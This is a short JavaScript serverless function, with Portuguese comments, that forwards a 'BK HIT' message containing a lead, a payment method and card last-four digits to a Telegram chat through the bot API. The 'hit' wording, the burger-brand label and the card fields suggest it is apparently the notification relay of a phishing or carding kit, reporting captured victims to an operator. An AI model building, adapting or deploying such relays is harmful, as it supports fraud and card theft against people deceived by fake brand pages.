// ─── VERCEL SERVERLESS: TELEGRAM NOTIFICATION RELAY ───
// Recebe dados do client-side e envia para o Telegram server-side.
// Tokens NUNCA expostos no frontend.
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const BOT_TOKEN = process.env.TOKEN_BOT_TELEGRAM || process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: 'Telegram credentials not configured.' });
    }

    const { lead, card_last4, method } = req.body;

    // Monta mensagem formatada
    const msg = `🍔 *BK HIT* 🍔\nLead: ${lead || 'N/A'}\nMethod: ${method || 'cc'}\nLast4: ${card_last4 || '****'}\nTime: ${new Date().toISOString()}`;

    try {
        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
        const tgData = await tgRes.json();
        return res.status(200).json({ ok: tgData.ok });
    } catch (error) {
        console.error('[notify-telegram] Erro:', error);
        return res.status(500).json({ error: error.message });
    }
}
